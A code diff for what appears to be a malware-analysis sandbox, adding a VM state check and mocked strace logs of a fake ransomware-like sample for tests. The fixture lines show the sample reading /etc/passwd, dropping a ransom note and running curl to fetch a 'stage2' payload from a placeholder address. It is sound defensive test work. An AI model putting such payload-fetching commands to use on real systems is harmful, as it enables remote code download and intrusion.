@@ -390,6 +390,15 @@ class VMManager(VMBackend):
             self.logger.error(f"run_command failed: {e}")
             return ""
 
+    async def vm_state(self, vm_name):
+        dom = self._get_domain(vm_name)
+        if not dom:
+            return "unknown"
+        try:
+            return "running" if dom.isActive() else "stopped"
+        except libvirt.libvirtError:
+            return "unknown"
+
     async def verify_environment(self, vm_name):
         try:
             conn = self._get_conn()
@@ -574,7 +583,25 @@ class MockVMManager(VMBackend):
     async def inject_file(self, vm_name, local_path, guest_path):
         return True
 
+    MOCK_STRACE = {
+        "/tmp/strace.log.1234": [
+            '10:00:00.000100 execve("/malware_sample", ["/malware_sample"], 0x7ffd0 /* 9 vars */) = 0',
+            '10:00:00.000400 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3',
+            '10:00:00.000900 openat(AT_FDCWD, "/tmp/DECRYPT_FILES.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4',
+            '10:00:00.001200 vfork() = 1240',
+            '10:00:00.003000 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
+        ],
+        "/tmp/strace.log.1240": [
+            '10:00:00.001300 execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/stage2"], 0x7ffd1 /* 9 vars */) = 0',
+            '10:00:00.001800 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
+        ],
+    }
+
     async def run_command(self, vm_name, command, shell="/bin/sh"):
+        if command.startswith("ls /tmp/strace.log"):
+            return " ".join(self.MOCK_STRACE)
+        if command.startswith("cat /tmp/strace.log"):
+            return "\n".join(self.MOCK_STRACE.get(command.split()[-1], []))
         if "strace" in command:
             return "execve('/bin/ls', ['ls'], 0x7ffd989c8d30) = 0\nopenat(AT_FDCWD, '.', O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3"
         if "yara" in command and "/proc" in command:
@@ -600,6 +627,9 @@ packer_match [packer] /proc/5678/mem
 
     async def verify_environment(self, vm_name):
         return True, "OK"
+
+    async def vm_state(self, vm_name):
+        return "stopped"
 
     async def find_internet_facing_networks(self, vm_name):
         return []
